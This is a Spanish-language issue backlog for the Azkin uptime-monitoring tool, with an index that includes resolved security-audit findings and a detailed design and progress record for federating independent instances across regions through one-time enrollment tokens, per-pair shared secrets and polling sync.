# Backlog de Issues

Este archivo concentra problemas detectados para resolver en siguientes iteraciones.

## Estado
- [ ] Abierto
- [x] Resuelto

## Indice

### Funcionalidad / bugs reportados

| Codigo | Titulo | Prioridad | Estado |
|---|---|---|---|
| [AZ-049](#az-049-federacion-de-instancias-azkin-independientes-en-distintas-regiones-geograficas-con-vista-de-monitoreo-combinada-y-comunicacion-cifrada-por-enrollment) | Federacion de instancias Azkin independientes en distintas regiones, con vista combinada y comunicacion cifrada por enrollment | Alta | [ ] Abierto |
| [AZ-050](#az-050-bugs-y-brechas-de-ux-encontrados-en-qa-de-la-federacion-de-instancias-az-049) | Bugs y brechas de UX encontrados en QA de la federacion de instancias (AZ-049) | Alta | [~] En progreso |
| [AZ-051](#az-051-datos-inconsistentes-en-el-detalle-de-monitor-ultimo-chequeo-nunca-uptime-real-y-100-operativo-fijo-sobre-bloques-caidos) | Datos inconsistentes en el detalle de monitor: "Ultimo chequeo: Nunca" pese a tener historial real, y "100% Operativo" fijo sobre bloques caidos | Alta | [x] Resuelto |
| [AZ-052](#az-052-auditoria-de-seguridad-bypass-de-validacion-de-certificado-tls-en-el-envio-de-alertas-por-email) | Auditoria de seguridad: bypass de validacion de certificado TLS en el envio de alertas por email | Media | [x] Resuelto |
| [AZ-053](#az-053-toma-de-cuentas-ajenas-import-de-backup-acepta-un-passwordhash-arbitrario-y-resetear-contrasena-de-admin-no-valida-que-el-id-sea-realmente-un-admin) | Auditoria de seguridad: toma de cuentas ajenas via import de backup y reset de contraseña de Admin sin scope | Alta | [x] Resuelto |
| [AZ-054](#az-054-sin-revocacion-de-sesion-bloqueareliminar-un-usuario-o-cambiarle-permisos-no-invalida-sus-tokens-ya-emitidos-y-el-token-de-acceso-es-intercambiable-por-el-de-refresh) | Auditoria de seguridad: sin revocacion de sesion, y token de acceso intercambiable por el de refresh | Alta | [x] Resuelto |
| [AZ-055](#az-055-el-rate-limiter-anti-fuerza-bruta-de-loginresetenrollment-es-evadible-el-backend-queda-expuesto-en-todas-las-interfaces-y-confia-en-x-forwarded-for) | Auditoria de seguridad: rate limiter anti fuerza-bruta evadible (puerto expuesto + X-Forwarded-For) | Alta | [x] Resuelto |
| [AZ-056](#az-056-el-token-de-recuperacion-de-contrasena-se-loguea-en-texto-plano-cuando-no-hay-smtp-configurado) | Auditoria de seguridad: token de recuperacion de contraseña logueado en texto plano sin SMTP | Alta | [x] Resuelto |
| [AZ-057](#az-057-cambiar-la-propia-contrasena-no-exige-la-contrasena-actual) | Auditoria de seguridad: cambiar la propia contraseña no exige la contraseña actual | Media | [x] Resuelto |
| [AZ-058](#az-058-inyeccion-html-en-el-email-de-informes-periodicos-e-inyeccion-json-en-el-payload-de-webhooks-de-notificacion) | Auditoria de seguridad: inyeccion HTML en informes por email e inyeccion JSON en webhooks | Media | [x] Resuelto |
| [AZ-059](#az-059-exportacion-csv-vulnerable-a-inyeccion-de-formulas-csvexcel-injection) | Auditoria de seguridad: exportacion CSV vulnerable a inyeccion de formulas | Media | [x] Resuelto |
| [AZ-060](#az-060-el-backup-descargable-expone-los-password-hash-de-todos-los-adminsviewers-y-la-clave-privada-tls-a-cualquier-admin) | Auditoria de seguridad: el backup expone password hashes de todos y la clave privada TLS a cualquier Admin | Media | [~] Mayormente resuelto |
| [AZ-061](#az-061-las-api-keys-son-equivalentes-a-un-admin-completo-sin-poder-acotarlas-a-monitores-o-grupos-especificos) | Auditoria de seguridad: las API keys son equivalentes a un Admin completo, sin scope acotable | Media | [~] Mayormente resuelto |
| [AZ-062](#az-062-las-credenciales-snmp-nunca-se-enmascaran-visibles-para-viewers-con-permiso-sobre-un-solo-monitor-y-en-texto-plano-en-el-log-de-auditoria) | Auditoria de seguridad: credenciales SNMP nunca se enmascaran (API y audit log) | Media | [x] Resuelto |
| [AZ-063](#az-063-azkin_jwt_secret-sin-longitud-minima-de-el-se-deriva-ademas-la-clave-de-cifrado-en-reposo-de-tlsfederacion) | Auditoria de seguridad: AZKIN_JWT_SECRET sin longitud minima | Media | [x] Resuelto |
| [AZ-064](#az-064-credenciales-por-defecto-en-envexample-parecen-contrasenas-reales-no-placeholders-obvios-y-no-hay-verificacion-al-arrancar) | Auditoria de seguridad: credenciales de ejemplo poco obvias en .env.example, sin verificacion al arrancar | Baja | [x] Resuelto |
| [AZ-065](#az-065-sin-cabeceras-de-seguridad-helmet-en-el-dashboard-de-administracion-el-contenedor-backend-corre-como-root) | Auditoria de seguridad: sin cabeceras de seguridad (helmet); contenedor backend corre como root | Baja | [x] Resuelto |
| [AZ-066](#az-066-miscelanea-de-hardening-de-autenticacion-rate-limit-compartido-sin-bloqueo-por-intentos-fallidos-politica-de-contrasena-debil-y-otros-gaps-menores) | Auditoria de seguridad: miscelanea de hardening de autenticacion | Baja | [~] Mayormente resuelto |

### UX / Funcionalidad (batch post-auditoria de seguridad)

| Codigo | Titulo | Prioridad | Estado |
|---|---|---|---|
| [AZ-033](#az-033-benchmark-uxui-y-propuesta-de-identidad-visual-diferenciada-frente-a-uptime-robot-y-uptime-kuma) | Benchmark UX/UI y propuesta de identidad visual diferenciada frente a Uptime Robot y Uptime Kuma | Frontend | Media | [ ] Abierto |

### Calidad de codigo / deuda tecnica (auditoria senior)

| Codigo | Titulo | Area | Prioridad | Estado |
|---|---|---|---|---|
| [AZ-016](#az-016-componentes-dios-en-el-frontend-dashboardts-2300-lineas-y-settingsts-1180-lineas-sin-descomposicion) | Componentes "Dios": `dashboard.ts` (~2300L) y `settings.ts` (~1180L) | Frontend | Media-Alta | [~] Mayormente resuelto |

---



## AZ-049) Federacion de instancias Azkin independientes en distintas regiones geograficas, con vista de monitoreo combinada y comunicacion cifrada por enrollment
- Codigo: AZ-049
- Estado: [~] En progreso — slices 1, 2 y 3 resueltas (enrollment, secreto compartido, sondeo, vinculos, UI); pendiente solo Informes (AZ-045). Ver tambien AZ-050 (bugs de QA sobre esta implementacion).
- Prioridad: Alta
- Reportado: 2026-07-22

### Progreso (slice 1 — enrollment)
Implementado y verificado end-to-end (dos instancias locales reales, no solo tests unitarios):
token de un solo uso (`CreateEnrollmentTokenUseCase`), aceptacion del lado remoto
(`AcceptEnrollmentUseCase`), union desde el lado que inicia (`JoinFederationUseCase`), listado y
revocacion (`ListFederatedInstancesUseCase`/`RevokeFederatedInstanceUseCase`), todo bajo
`application/use-cases/federation/` y expuesto en `infrastructure/http/routes/federation.routes.ts`.

**Ajuste de diseño respecto al planteamiento original de esta issue:** en vez de una CA propia que
firma certificados de terceros (ver items mas abajo que aun mencionan "CA"), cada instancia genera
un unico certificado autofirmado (`infrastructure/security/federation-certificate-generator.ts`,
`node-forge`) y la confianza se resuelve por **pinning de huella (fingerprint)**, no por cadena de
CA — mas simple para un maximo de 5 pares y sin perder ninguna garantia de seguridad real.

### Progreso (slice 2 — puerto dedicado, sondeo, vinculos y UI) — [SUPERADO, ver slice 3 mas abajo]

> El modelo mTLS/puerto dedicado descrito en este recuadro fue reemplazado el 2026-07-23 (ver
> "Progreso slice 3" mas abajo) tras detectar en un despliegue real que el puerto dedicado era
> exactamente el tipo de friccion operativa que la federacion busca evitar (puerto extra que abrir
> y sincronizar por maquina, con `ECONNREFUSED` cuando el compose de una instancia no lo publicaba).
> Se deja este recuadro como registro historico de esa primera implementacion, no como el diseño
> vigente.

Implementado y verificado end-to-end (dos instancias locales reales, including un tick real del
cron de sondeo y una revocacion en caliente):

- **Listener mTLS dedicado** (`infrastructure/http/federation-server-manager.ts`,
  `AZKIN_FEDERATION_PORT`, default 8444): app Express separada de la principal, `requestCert: true`
  sin cadena de CA. Middleware `verify-peer-certificate.ts` valida la huella contra
  `FederatedInstance.findEnrolledByFingerprint` en **cada request** (no solo en el handshake TLS) —
  confirmado manualmente que revocar corta el acceso de inmediato, con `401` limpio.
- El enrollment (slice 1) ahora tambien intercambia el puerto de federacion de cada lado
  (`remoteFederationPort`), para que las llamadas mTLS posteriores sepan a que puerto apuntar.
- **Cliente mTLS saliente** (`infrastructure/security/federation-fetch-client.ts`) usa
  `undici.Agent` con el certificado propio como client cert (ya era dependencia directa del
  backend) — separado del `fetch()` plano que sigue usando el bootstrap de enrollment (sin cert).
- **Vinculos de monitoreo — modelado como pares, no como "grupo" con id sincronizado**:
  `FederatedMonitorLink` ancla cada vinculo en el monitor LOCAL (`{localMonitorId,
  federatedInstanceId, remoteMonitorId}`); un monitor local puede tener N vinculos (uno por peer).
  Esto reemplaza al `FederatedMonitorGroup` planteado originalmente mas abajo en esta issue —
  sincronizar un id de grupo entre instancias sin autoridad compartida no aportaba nada que los
  pares no resolvieran ya de forma mas simple.
- **Modelo de confianza deliberadamente simple**: una vez federadas, cualquiera de las dos
  instancias puede pedir el catalogo de monitores del otro (`GET /federation/monitors`) o
  heartbeats de cualquier monitor por id (`GET /federation/sync`) — sin una ACL granular adicional
  por monitor, mismo nivel "todo o nada" que ya usa el modelo multi-admin de este proyecto.
- **Sondeo periodico**: `RunFederationSyncUseCase` (mirror de `RunScheduledReportsUseCase`, cron
  cada 2 min) persiste en `FederatedHeartbeat` (Time-Series, TTL 30 dias, igual que los heartbeats
  locales) y actualiza `lastSyncedAt` por vinculo. "Federacion sin reportar" (umbral fijo, 3x el
  intervalo del tick) envia un correo via el mismo mecanismo que ya usan los Informes
  (`ResolveDefaultAlertRecipients` + `IMailer`), con flag `notifiedDown` para no repetir en cada tick.
- **Severidad combinada compartida**: se extrajo el `combineStatus` que ya usaba
  `GetGroupOverviewUseCase` a `application/services/combine-monitor-status.ts`
  (`DOWN > DEGRADED > PENDING > MAINTENANCE > UP`) y se reutiliza tal cual en
  `GetFederatedComparisonUseCase` — una sola regla de severidad en todo el sistema, no dos.
- **UI**: pestaña "Federacion" en `/settings` (enrollment, listado/revocacion, explorar monitores
  del par, crear/eliminar vinculos) y un componente compartido
  (`shared/components/federated-comparison.ts`) con el selector "Por region/Combinado" en el
  detalle de monitor del dashboard — el combinado siempre queda etiquetado como valor derivado
  (AZ-012), nunca reemplaza la vista por-region.

**Bug encontrado y corregido durante la verificacion manual:** el listener mTLS no tenia montado
el `errorHandler` compartido (solo estaba en la app principal) — un rechazo de
`verifyPeerCertificate` caia en el manejador de error por defecto de Express y devolvia `500`
generico en vez de `401` JSON. Corregido montando el mismo `errorHandler` en la app de federacion.

**Pendiente:** la extension opcional de Informes Periodicos (AZ-045) para incluir desglose
federado — deliberadamente fuera de esta ronda (ver Descripcion de esa issue), es la unica pieza
que sigue sin construir del diseño completo de AZ-049. El resto de esta issue (Comportamiento
esperado/Criterios de aceptacion/Pistas de investigacion mas abajo) sigue describiendo el diseño
completo original, incluyendo terminologia ("CA", "FederatedMonitorGroup") ya superada por los
ajustes de diseño de arriba — estos dos recuadros de Progreso son la fuente de verdad de que hay
hecho realmente.

### Progreso (slice 3 — 2026-07-23: reemplazo de mTLS/puerto dedicado por secreto compartido)

**Por que se cambio:** en un despliegue real (backend de produccion HTTP plano en un puerto
distinto al de desarrollo local) el puerto dedicado de federacion nunca quedo publicado desde el
compose de esa maquina, dando `ECONNREFUSED` pese a que el host respondia ping — exactamente el
tipo de friccion de "un puerto mas que sincronizar por maquina" que la federacion deberia evitar,
no sumar. Se evaluo reusar el puerto que cada instancia ya usa para su API/dashboard (garantizado
abierto, es como el Admin ya entra al producto) en vez de uno dedicado.

**Cambios:**
- Se elimino el listener mTLS dedicado (`federation-server-manager.ts`), la identidad por
  certificado (`federation-identity-service.ts`, `federation-certificate-generator.ts` con
  `node-forge`) y el middleware `verify-peer-certificate.ts`.
- Nuevo modelo: durante el enrollment, quien se une genera un **secreto compartido aleatorio por
  par** (32 bytes) y lo manda en el mismo pedido de bootstrap (protegido solo por el token de un
  solo uso, igual que antes protegia el intercambio de certificados). Cada lado lo guarda cifrado
  en reposo (`FederatedInstance.remoteSecretEncrypted`, AES-256-GCM via `tls-key-cipher.ts` —
  reutiliza `AZKIN_TLS_ENCRYPTION_KEY`/su derivacion automatica de `AZKIN_JWT_SECRET`).
- Los endpoints peer-to-peer (`/monitors`, `/sync`) pasan a montarse en `/api/v1/federation/peer`
  sobre el **mismo `app`/puerto** que el resto de la API, guardados por el nuevo middleware
  `verify-peer-secret.ts` (header `X-Federation-Secret`, comparacion contra las — maximo 5 —
  instancias activas descifradas en memoria, sin necesitar indice).
- Se elimino `AZKIN_FEDERATION_PORT` y el modelo de puerto configurable (`FederationPortSettings`,
  `GetFederationPortUseCase`/`ApplyFederationPortUseCase`) — ya no hay puerto que configurar. El
  singleton de "direccion propia" (`SetFederationOwnUrlUseCase`) se mantiene tal cual, renombrado a
  `FederationSettings`.
- Beneficio adicional no buscado originalmente: la federacion funciona igual con HTTP plano o con
  HTTPS, sin cambiar nada de su configuracion — **nota (2026-07-27):** "HTTPS nativo" en el backend
  ya no existe (se elimino, ver nota de esa fecha en esta misma issue); si se quiere cifrar el
  trafico de una instancia, se hace terminando TLS en nginx (`docs/instalacion-docker.md` §6), y la
  federacion sigue funcionando igual una vez que la URL propia se actualiza a `https://`.
- **Limite conocido (ya existia, no cambia):** cambiar la direccion propia no reanuncia el cambio a
  los pares ya enrolados — siguen usando la `remoteUrl` vieja hasta volver a enrolarse.

### Descripcion
Hoy Azkin corre como una unica instancia (sus 3 contenedores: `azkin-db`, `azkin-back`, `azkin-front`) con una
unica ubicacion geografica de origen para todos sus checks activos (HTTP, Ping, TCP, DNS, SNMP). Esto impide
distinguir "el sitio esta realmente caido" de "hay un problema de red regional entre el datacenter de Azkin y el
sitio monitoreado" (ej. un corte de peering entre Chile y Asia que no afecta al resto del mundo).

Caso de uso concreto: desplegar un stack Azkin completo en Chile y otro stack Azkin completo en China, cada uno
monitoreando (entre otras cosas) las mismas paginas/servicios, y poder ver en un solo lugar tanto el estado
individual de cada region como una vista combinada/promediada.

**Decision de arquitectura (reemplaza el planteamiento inicial de "central unico + nodos sonda"):** el modelo
elegido es **federacion de instancias completas e independientes**, no un central del que todo dependa:

- Cada ubicacion corre un Azkin completo y autosuficiente: su propia base de datos, su propio dashboard, sus
  propios monitores, su propia configuracion de alertas/notificaciones. Ninguna instancia necesita que otra este
  viva para poder chequear, alertar o mostrar su propio dashboard.
- Dos (o mas) instancias se **enrolan** entre si (el enrollment en si siempre es par a par: cada par de instancias
  intercambia su propio token y certificados). Lo que **no** debe ser pairwise es el vinculo de "cual monitor es el
  mismo objetivo": se modela como un **grupo de monitoreo equivalente** (un conjunto de {instancia, monitor} que
  representan el mismo sitio/servicio), para que 3 o mas instancias (ej. Chile, China, Alemania) puedan combinarse
  en una sola vista sin tener que mantener un vinculo cruzado independiente entre cada par. Para que el grupo
  funcione entre 3+ instancias, cada par involucrado debe estar enrolado entre si (A-B, A-C y B-C), pero el
  agrupamiento de monitores es una capa aparte de esa topologia de confianza.
- Si una instancia deja de responder, las demas no pierden funcionalidad propia (siguen chequeando, alertando y
  mostrando su dashboard local); lo unico que se pierde es la actualizacion del combinado con los datos de esa
  instancia, hasta que vuelva a estar disponible.
- Esto logra la independencia tipo "HA informal" que se busca (una caida en una region no tumba ni bloquea a las
  demas) **sin** la complejidad de un sistema distribuido con consenso: no hay una unica fila de base de datos que
  dos instancias deban editar a la vez, cada una es dueña exclusiva de sus propios monitores/datos. Un modelo de
  malla con autoridad compartida y resolucion de conflictos (evaluado y descartado en la conversacion previa) no
  es necesario para este caso de uso.
- Alertas: por defecto cada instancia notifica de forma **totalmente independiente** segun lo que ve localmente
  (Chile alerta con lo que ve Chile, China alerta con lo que ve China) — no hay que esperar consenso entre
  instancias para avisar. Queda como mejora futura opcional (fuera de alcance de esta issue) un modo "confirmar
  con la instancia federada antes de notificar" para reducir falsos positivos de un solo lado.

El canal de comunicacion entre instancias federadas debe ir cifrado extremo a extremo y autenticado por instancia,
sin depender de compartir un secreto de larga duracion en texto plano. La referencia de diseño acordada es el
modelo de enrollment de Elasticsearch/Kibana: un token de un solo uso (hash largo, con expiracion corta) que se
genera en una instancia y se pega una unica vez en la otra al enrolarlas; ese token se consume durante un proceso
de enrollment que emite certificados (mTLS) para ese par especifico de instancias, y a partir de ahi toda la
comunicacion se autentica con esos certificados, no con el token.

**Requisito operacional:** todo el mecanismo de reconstruccion de historial (`since=<timestamp_utc>`) asume que el
reloj de cada instancia esta razonablemente sincronizado (NTP). Un reloj desfasado en un VPS puede hacer que el
cursor traiga datos de mas o de menos sin ningun error visible — se documenta como requisito de despliegue, igual
que otros requisitos de red/infraestructura que ya lista el README.

**Alcance deliberadamente acotado (herramienta simple, no un sistema distribuido de gran escala):** esta issue se
diseña y se limita a **un maximo de 5 instancias federadas simultaneas**. El modelo de malla completa (cada par se
enrola directamente, hasta 10 enrollments en el caso de 5 instancias) es simple y suficiente para ese tamaño y no
necesita automatizar nada mas. **No es objetivo de esta issue** soportar 10+ instancias, invitaciones en bloque, ni
un modo relay/hub — eso seria sobreingenieria para el caso de uso real (un puñado de regiones), y si algun dia hace
falta escalar mas alla de 5, deberia evaluarse como una issue nueva y separada, con su propio analisis, en vez de
carter este diseño con complejidad que hoy nadie necesita. El limite de 5 se aplica como una cuota dura (no solo
una recomendacion) y queda advertido tanto en `docs/` como en la UI de `/settings`.

### Comportamiento esperado
1. Un Admin puede generar, desde `/settings`, un token de enrollment (hash largo, un solo uso, expiracion corta —
   ej. 15-30 min) para invitar a otra instancia Azkin a federarse.
2. El Admin de la otra instancia pega ese token en su propio `/settings` para completar el enrollment: se
   intercambian certificados (mTLS) especificos para ese par de instancias, y el token queda invalidado de
   inmediato tras usarse.
3. La comunicacion entre instancias federadas corre sobre un puerto dedicado y configurable (no necesariamente el
   mismo puerto del frontend/API web), analogo a como AZ-006 permite configurar el puerto HTTPS. El intercambio de
   datos se hace por sondeo periodico autenticado por certificado (cada instancia consulta a sus pares a
   intervalos regulares), no por una conexion persistente tipo WebSocket — es mas simple de operar y de
   recuperar tras un corte, y como no existe un "central" fijo, cualquiera de las dos instancias puede iniciar el
   sondeo hacia la otra sin que importe cual.
4. Para vincular un monitor local con su equivalente en otras instancias federadas, el Admin explora un listado
   acotado de los monitores de cada instancia remota ya federada (solo nombre/URL/tipo, nunca configuracion
   sensible como credenciales SNMP o secretos de notificacion), y agrega cada uno a un **grupo de monitoreo
   equivalente** (no un vinculo 1:1): el grupo puede tener 2, 3 o mas miembros, uno por instancia, todos
   representando "el mismo objetivo" (ej. "este HTTP en Chile + ese HTTP en China + ese HTTP en Alemania son el
   mismo sitio"). Agregar o quitar un miembro del grupo no requiere recrear vinculos con los demas miembros.
5. Para un monitor que pertenece a un grupo de monitoreo equivalente, el dashboard ofrece un **selector visual de
   vista** (ej. dos pestañas o un toggle "Por region | Combinado") que cualquier usuario con permiso sobre ese
   monitor puede cambiar en el momento, sin que un Admin tenga que activarlo de antemano ni que quede guardado como
   configuracion del grupo. La vista por defecto al entrar es "Por region" (estado y latencia de cada instancia
   miembro, sin mezclar). Si el usuario cambia a "Combinado", ve un agregado (latencia promedio entre todos los
   miembros del grupo, y un estado unico calculado con la jerarquia de severidad fija
   `DOWN > DEGRADED > PENDING > MAINTENANCE > UP` — la **misma jerarquia que ya usa `combineStatus()` en
   `get-group-overview.usecase.ts` para combinar el estado de un grupo local de monitores**, reutilizada tal cual
   para no tener dos reglas de severidad distintas conviviendo en el mismo sistema: el combinado toma el peor
   estado presente entre los miembros, mostrando ademas cuantos estan afectados sobre el total — ej. "DOWN (1/3
   regiones)"). Un miembro en `MAINTENANCE` no opaca un `DOWN`/`DEGRADED`/`PENDING` real de otro miembro (mismo
   criterio de AZ-040), aunque en la vista "Por region" se siga viendo cual instancia esta en mantenimiento. Todo
   valor combinado queda siempre
   etiquetado en pantalla como derivado, nunca presentado como si fuera una medicion directa (mismo criterio que ya
   aplico este proyecto en AZ-012 sobre no presentar datos fabricados como si fueran una medicion real). Cambiar de
   vista es solo una preferencia de visualizacion momentanea, no una decision de configuracion que otro usuario
   herede.
6. Cada instancia sigue funcionando de forma completa e independiente (chequeos, alertas, dashboard local) esté o
   no disponible cualquiera de sus pares federados.
7. Si una instancia federada deja de responder al sondeo por mas de un umbral configurable, la vista combinada lo
   indica claramente ("sin datos de [instancia] desde [hora]") en vez de mostrar un dato viejo como si fuera
   actual, y se dispara una notificacion local (reutilizando el sistema de notificaciones multicanal existente)
   avisando que esa federacion especifica quedo sin reportar.
8. Un Admin puede desvincular/revocar la federacion con otra instancia desde `/settings`, cortando de inmediato el
   intercambio de datos con esa instancia (sin afectar el resto de instancias federadas ni el funcionamiento local).
9. El listado de monitores remotos y los datos de monitores vinculados respetan el modelo de permisos existente:
   un Viewer solo ve, dentro de la vista combinada, los monitores para los que ya tiene permiso localmente (mismo
   criterio de aislamiento que AZ-001/AZ-021), nunca datos adicionales por el solo hecho de existir una federacion.
10. Cada resultado recibido de un par federado se persiste localmente (coleccion Time-Series con el mismo TTL de
    30 dias que ya usan los heartbeats propios, ver stack tecnologico en el README), no solo se muestra en vivo.
    Toda estampa de tiempo que viaja entre instancias o se guarda en esa coleccion es **UTC** (ISO 8601 con offset
    `Z`); el frontend de cada instancia es el unico responsable de convertirla a la hora local de quien mira el
    dashboard (mismo ajuste que ya se hizo en AZ-048 para no mezclar referencias horarias distintas). El sondeo
    periodico no trae solo "el ultimo estado": cada instancia recuerda el timestamp UTC del ultimo dato recibido de
    cada par y lo envia como cursor (`since=<ultimo_timestamp_utc>`), de modo que el par devuelve en lote todos los
    resultados generados desde ese punto — esto es lo que permite reconstruir sin huecos el historial combinado de
    una ventana en que el par estuvo desconectado, una vez que vuelve a estar disponible.
11. La vista comparativa multi-region se resuelve como tabla/grafico de lineas por region (mismo estilo ECharts que
    ya usa `dashboard.ts`), no como mapa geografico interactivo — mantiene consistencia visual con el resto del
    dashboard actual y evita duplicar esfuerzo con AZ-033 (benchmark de identidad visual), que sigue siendo el
    lugar para decidir si mas adelante conviene una vista tipo mapa.
12. Al crear o editar un informe periodico (AZ-045), si el reporte incluye uno o mas monitores vinculados a una
    instancia federada, el formulario pregunta explicitamente al Admin si el informe debe incluir tambien el
    desglose de las instancias federadas para esos monitores, o generarse igual que hoy (solo con datos locales).
    La opcion por defecto es "solo datos locales" (mismo comportamiento que existe hoy, sin sorpresas para
    informes ya configurados).
13. La CA local (o el par de llaves usado para emitir certificados mTLS a los pares) se genera una sola vez y se
    persiste de forma segura (en Mongo o en un volumen Docker montado, ver AZ-006/AZ-041 sobre manejo de material
    criptografico sensible), de modo que reiniciar el contenedor `azkin-back` no invalide los certificados ya
    emitidos ni rompa las federaciones existentes.
14. Revocar una federacion no depende solo de que el certificado deje de ser valido en el proximo handshake TLS:
    cada request de sondeo o de listado de monitores verifica ademas, contra el estado persistido en Mongo, que
    esa instancia no fue revocada — asi, una conexion HTTP con keep-alive ya abierta al momento de revocar tambien
    deja de servir datos en la siguiente request, sin esperar a que expire o se renueve la conexion.
15. Cada instancia federada tiene una etiqueta/nombre visible asignado por el Admin (ej. "Santiago-VPS1"), usado
    para identificarla en la vista "Por region" y en los graficos, en vez de mostrar solo su direccion/IP.
16. Existe un limite **duro** de 5 instancias federadas simultaneas por instancia (cuota, en la misma linea que la
    cuota existente de 50 monitores). Intentar federar una sexta instancia se rechaza con un mensaje claro que
    explica el limite, no con un error generico. El limite se muestra tambien de forma proactiva en `/settings`
    (ej. "3/5 instancias federadas") para que el Admin lo vea antes de intentar pasarse.
17. El umbral de "federacion sin reportar" (item 7) tiene un valor por defecto explicito y documentado (ej. 3
    sondeos fallidos consecutivos), configurable por el Admin igual que otros umbrales del sistema (ver AZ-042).
18. Se documenta en `docs/` el requisito de red nuevo (puerto dedicado, direccion del trafico), el requisito de
    reloj sincronizado (NTP) entre instancias federadas, y el limite de 5 instancias como una decision deliberada
    de alcance (no una limitacion tecnica temporal), siguiendo el mismo formato de la tabla de puertos que ya
    existe en `docs/instalacion-docker.md` §12.
19. La documentacion de esta funcionalidad no queda solo en esta issue: se actualizan los 3 documentos que el
    proyecto ya usa para esto, cada uno con su rol (ver tabla de "📚 Documentación" del README):
    - **`docs/ARCHITECTURE.md`**: nueva seccion numerada (siguiendo el estilo de las secciones existentes, ej.
      §12 Mantenimiento, §13 DEGRADADO) que explica el **porque** de la federacion (distinguir una caida real de
      un problema de red regional, lograr independencia entre regiones sin la complejidad de un sistema
      distribuido con consenso — la misma decision de arquitectura ya razonada en esta issue) y el **como**
      (flujo de enrollment, grupo de monitoreo equivalente, vista combinada), con al menos un diagrama `mermaid`
      (mismo formato que ya usan las secciones 1, 2 y 6 de ese documento) mostrando el flujo de enrollment
      (token → certificados mTLS) y otro mostrando el flujo de sondeo periodico entre dos instancias.
    - **`docs/instalacion-docker.md`**: actualiza §12 (tabla de puertos) con el puerto de federacion, agrega el
      requisito de NTP y documenta explicitamente el limite de 5 instancias como decision de producto, no como
      "todavia no soportamos mas".
      - **`README.md`**: agrega la federacion a "✨ Funcionalidades destacadas" con una descripcion breve que
      incluya el limite de 5 instancias (para que quede visible sin tener que entrar a `docs/`), y enlaza a la
      seccion nueva de `ARCHITECTURE.md` para el detalle.

### Criterios de aceptacion
1. Existe flujo de enrollment entre dos instancias: generar token en A → pegarlo en B → certificados emitidos →
   ambas instancias se ven mutuamente como "federada: conectada" en `/settings`.
2. El token de enrollment no sirve una segunda vez, y expira solo si no se usa dentro de la ventana configurada.
3. Al crear un vinculo, el Admin puede buscar/seleccionar el monitor remoto desde un listado (no requiere copiar
   un ID a mano), y ese listado no expone campos sensibles del monitor remoto.
4. Un monitor vinculado entre 2+ instancias federadas abre siempre en vista "Por region" (resultado desagregado);
   el usuario puede cambiar al momento a "Combinado" con el selector visual y volver atras, sin que esa preferencia
   quede guardada como configuracion del vinculo ni la vea afectada otro usuario. La vista "Combinado" siempre
   queda etiquetada en pantalla como valor derivado.
5. Apagar completamente la instancia B (simulando una caida total) no afecta ningun chequeo, alerta ni acceso al
   dashboard de la instancia A — solo la vista combinada deja de recibir datos frescos de B y, pasado el umbral
   configurado, dispara una notificacion de "federacion sin reportar".
6. Revocar la federacion con una instancia desde `/settings` corta su capacidad de intercambiar datos (su
   certificado ya no es aceptado) sin reiniciar la instancia local ni afectar otras federaciones activas.
7. Un Viewer sin permiso sobre un monitor local no ve datos de su vinculo remoto en la vista combinada, aunque el
   vinculo exista y otro Admin/Viewer con permiso si lo vea.
8. Existe registro de auditoria (ver modelo ya usado en AZ-043) para alta, revocacion, perdida/recuperacion de
   conexion y creacion/eliminacion de un vinculo de monitor.
9. Tras desconectar y reconectar un par federado (simulando un corte de red de varios minutos u horas), el
   sondeo posterior a la reconexion pide expresamente `since=<ultimo_timestamp_utc>` y el historial combinado de
   ese periodo se completa retroactivamente sin huecos, siempre que el dato original siga dentro del TTL de 30
   dias — no basta con traer solo el ultimo estado.
10. Un mismo instante mostrado en el dashboard de dos instancias en zonas horarias distintas (ej. Chile GMT-3 y
    China GMT+8) corresponde al mismo punto en UTC almacenado, y cada dashboard lo muestra convertido a su propia
    hora local sin desfase.
11. Reiniciar el contenedor `azkin-back` de una instancia no invalida sus certificados mTLS ni los de sus pares
    federados: tras el reinicio, el sondeo periodico sigue autenticando exitosamente sin necesidad de re-enrolar.
12. Con un monitor vinculado a 2 regiones, si una entra en ventana de Mantenimiento (AZ-040) y la otra reporta
    `DOWN` real, la vista "Combinado" muestra `DOWN`, no `MAINTENANCE` ni `UP`; la vista "Por region" sigue
    mostrando cual instancia esta en mantenimiento.
13. Un informe periodico (AZ-045) configurado para un monitor vinculado muestra, en su formulario de creacion/
    edicion, la pregunta de incluir o no el desglose de instancias federadas; un informe existente creado antes de
    esta funcionalidad sigue generandose igual que hoy (solo datos locales) sin requerir reconfiguracion.
14. La comparación multi-region en el dashboard se renderiza como tabla/grafico ECharts consistente con el resto
    de `dashboard.ts`, no como un mapa.
15. Con 3 instancias federadas entre si (topologia completa: A-B, A-C y B-C enroladas) y un grupo de monitoreo
    equivalente con un miembro por instancia, la vista "Combinado" refleja los 3 miembros (ej. "DOWN (1/3
    regiones)"), no solo 2 — agregar la tercera instancia al grupo no requiere recrear los vinculos existentes
    entre las otras dos.
16. Revocar la federacion con una instancia mientras hay una conexion de sondeo con keep-alive ya abierta corta el
    intercambio de datos en la request inmediatamente siguiente a la revocacion, sin esperar a que esa conexion
    expire o se renueve.
17. Cada instancia federada visible en `/settings` y en los graficos muestra su etiqueta asignada, no su
    direccion/IP cruda.
18. Federar una sexta instancia (por sobre el limite de 5) es rechazado con un mensaje claro (mismo patron que
    `QuotaExceededError`, ver AZ-014), no con un error generico, y `/settings` muestra el conteo actual antes de
    que el Admin lo intente (ej. "5/5 instancias federadas").
19. El umbral por defecto de "federacion sin reportar" esta documentado y es modificable desde `/settings` sin
    reiniciar el backend.
20. `docs/instalacion-docker.md` documenta el puerto nuevo, la direccion del trafico entre instancias federadas, el
    requisito de reloj sincronizado (NTP) y el limite de 5 instancias como decision de alcance.
21. `docs/ARCHITECTURE.md` tiene una seccion numerada nueva dedicada a la federacion, con al menos 2 diagramas
    `mermaid` (enrollment y sondeo periodico) y un parrafo que explica explicitamente el motivo de la decision de
    arquitectura (por que federacion y no "central + sondas" ni "malla P2P con consenso" — ver Descripcion de esta
    issue), no solo el "como" tecnico.
22. `README.md` menciona la federacion en "✨ Funcionalidades destacadas", incluye el limite de 5 instancias en esa
    misma mencion (no solo en `docs/`), y enlaza a la seccion nueva de `ARCHITECTURE.md`.

### Pistas de investigacion
- No hay un modelo previo exacto en el repo para esto: el monitor tipo "Push Pasivo" (agente que manda heartbeat
  remoto hacia Azkin) es de una sola direccion y de un agente liviano hacia un Azkin completo, mientras que aqui
  se necesita un intercambio entre dos instancias Azkin completas, cada una con su propio motor de checks
  (`infrastructure/checkers/*.ts`) corriendo de forma independiente.
